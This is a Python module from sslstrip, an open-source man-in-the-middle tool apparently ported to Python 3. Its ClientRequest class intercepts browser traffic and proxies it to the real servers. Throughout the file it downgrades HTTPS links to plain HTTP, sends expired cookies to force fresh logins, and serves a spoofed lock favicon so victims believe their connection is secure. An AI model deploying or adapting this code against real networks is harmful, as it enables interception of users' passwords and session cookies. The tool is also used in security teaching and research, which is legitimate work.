# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import urllib.parse
import logging
import os
import sys
import random
from twisted.web.http import Request
from twisted.internet import ssl, defer, reactor
from sslstrip.ServerConnectionFactory import ServerConnectionFactory
from sslstrip.ServerConnection import ServerConnection
from sslstrip.SSLServerConnection import SSLServerConnection
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner
from sslstrip.DnsCache import DnsCache


class ClientRequest(Request):
    """This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we don't like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    """

    def __init__(self, channel, queued, reactor=reactor):
        super(ClientRequest, self).__init__(channel, queued)
        self.reactor = reactor
        self.urlMonitor = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache = DnsCache.getInstance()

    def cleanHeaders(self):
        headers_to_remove = ["accept-encoding", "if-modified-since", "cache-control"]
        headers = {
            k: v for k, v in self.getAllHeaders().items() if k not in headers_to_remove
        }
        return headers

    def getPathFromUri(self):
        return self.uri[7:] if self.uri.startswith("http://") else self.uri

    def getPathToLockIcon(self):
        paths = ["lock.ico", "../share/sslstrip/lock.ico"]
        for path in paths:
            if os.path.exists(path):
                return path
        logging.warning("Error: Could not find lock.ico")
        return "lock.ico"

    def handleHostResolved(self, address, error=None):
        if error:
            logging.warning(f"Host resolution error: {str(error)}")
            self.finish()
            return

        logging.debug(
            f"Resolved host successfully: {self.getHeader('host')} -> {address}"
        )
        host = self.getHeader("host")
        headers = self.cleanHeaders()
        client = self.getClientIP()
        path = self.getPathFromUri()

        self.content.seek(0, 0)
        postData = self.content.read()
        url = "http://" + host + path

        self.dnsCache.cacheResolution(host, address)

        if not self.cookieCleaner.isClean(self.method, client, host, headers):
            logging.debug("Sending expired cookies...")
            self.sendExpiredCookies(
                host,
                path,
                self.cookieCleaner.getExpireHeaders(
                    self.method, client, host, headers, path
                ),
            )
        elif self.urlMonitor.isSecureFavicon(client, path):
            logging.debug("Sending spoofed favicon response...")
            self.sendSpoofedFaviconResponse()
        elif self.urlMonitor.isSecureLink(client, url):
            logging.debug("Sending request via SSL...")
            self.proxyRequest(
                address,
                self.method,
                path,
                postData,
                headers,
                self.urlMonitor.getSecurePort(client, url),
                is_ssl=True,
            )
        else:
            logging.debug("Sending request via HTTP...")
            self.proxyRequest(
                address, self.method, path, postData, headers, is_ssl=False
            )

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)
        logging.debug("Host cached." if address else "Host not cached.")
        return defer.succeed(address) if address else self.reactor.resolve(host)

    def process(self):
        logging.debug(f"Resolving host: {self.getHeader('host')}")
        host = self.getHeader("host")
        deferred = self.resolveHost(host)
        deferred.addBoth(self.handleHostResolved)

    def proxyRequest(
        self, host, method, path, postData, headers, port=80, is_ssl=False
    ):
        connectionFactory = ServerConnectionFactory(
            method, path, postData, headers, self
        )
        connectionFactory.protocol = SSLServerConnection if is_ssl else ServerConnection
        connect_func = self.reactor.connectSSL if is_ssl else self.reactor.connectTCP
        clientContextFactory = ssl.ClientContextFactory() if is_ssl else None
        connect_func(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302)
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)

        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()

    def sendSpoofedFaviconResponse(self):
        try:
            with open(self.getPathToLockIcon(), "rb") as icoFile:
                self.setResponseCode(200)
                self.setHeader("Content-type", "image/x-icon")
                self.write(icoFile.read())
        except IOError:
            logging.warning("File error: Couldn't open or read the file")
        self.finish()
